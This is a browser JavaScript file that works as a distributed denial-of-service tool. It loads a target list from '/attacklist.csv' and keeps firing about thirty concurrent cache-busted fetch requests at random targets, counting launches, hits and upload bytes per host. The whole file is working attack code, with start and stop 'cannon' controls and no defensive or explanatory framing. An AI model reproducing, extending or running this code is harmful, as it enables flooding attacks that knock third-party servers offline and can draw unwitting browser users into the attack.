(function () {
  var timeout = 5000;

  var elements = {
    btnStart: document.getElementById("btnAction"),
    btnStop: document.getElementById("btnStop"),
    counter: document.getElementById("txtCounter"),
    stats: document.getElementById("txtStats"),
  };

  var counter = {
    total: 0,
    hit: 0,
  };

  var stats = {
    bytes: {
      host: {},
      total: {
        upload: 0,
        download: 0
      }
    }
  }

  var isActive = false

  function refreshCounter() {
    elements.counter.innerHTML = `Launched: <strong>${counter.total}</strong>, Hit: <strong>${counter.hit}</strong>`;
  }

  function refreshStats() {
    elements.stats.innerHTML = JSON.stringify(stats, null, 2)
  }

  window.getTargets = function (cb) {
    fetch("/attacklist.csv").then((res) => {
      let id = 0;
      res.text().then((list) => {
        var targets = list
          .split("\n")
          .slice(1)
          .filter((i) => !!i)
          .map((i) => {
            var row = i.split(",");
            return {
              key: id++,
              title: row[0],
              method: row[1],
              host: row[2],
              port: row[3],
              path: row[4],
            };
          });
        cb(targets);
      });
    });
  };

  var getMaxConcurrent = function () {
    return 30;
  }

  window.stopCannon = function() {
    elements.btnStart.style.display = "initial";
    elements.btnStop.style.display = "none";
    isActive = false;
  }

  var calcRequestUploadBytes = function (target, url) {
      // TODO: factor in TLS?
      return (target.method || 'GET').length 
        + 1
        + url.length
        + 5  // http
        + 300 // headers
        + (target.body || '').length
  }

  var calcRequestDownloadBytes = function (res) {
      return 0 // TODO
  }

  var updateStats = function (host, type, bytes) {
    if (!stats.bytes.host[host]) {
      stats.bytes.host[host] = {upload: 0, download: 0}
    }

    stats.bytes.host[host][type] += bytes
    stats.bytes.total[type] += bytes
    refreshStats();
  }

  window.launchCannon = function (bytes, progressCb, done) {
    var maxConcurrent = getMaxConcurrent();
    elements.btnStart.style.display = "none";
    elements.btnStop.style.display = "initial";
    isActive = true;

    getTargets(function (targets) {
      function fireRequests() {
        function fire() {
          var target = targets[Math.floor(Math.random() * targets.length)];
          if (!isActive) { return }
          counter.total++;

          var rand = `${Math.floor(Math.random() * 1000000)}-${new Date().getTime()}`;
          refreshCounter();


          var url = `https://${target.host}:${target.port}/${(target.path || '').replace('{rand}', rand)}`;
          var method = target.method || 'GET';
          new Promise((resolve, reject) => {
            let controller = new AbortController();
            fetch(url, {
              method,
              signal: controller.signal,
              timeout: 5000,
              mode: "no-cors",
            }).then(resolve).catch(reject)
            setTimeout(() => {
              controller.abort()
            }, timeout)
          })
          .then(function (res) {
            updateStats(target.host, 'download', calcRequestDownloadBytes(res))
          })
          .finally(function (err) {
            counter.hit++;
            refreshCounter();
            // TODO until done
            fire();
          });

          updateStats(target.host, 'upload', calcRequestUploadBytes(target, url))
        }

        for (let i = 0; i <= maxConcurrent; i++) {
          fire()
        }
      }

      fireRequests();
    });
  };
})();
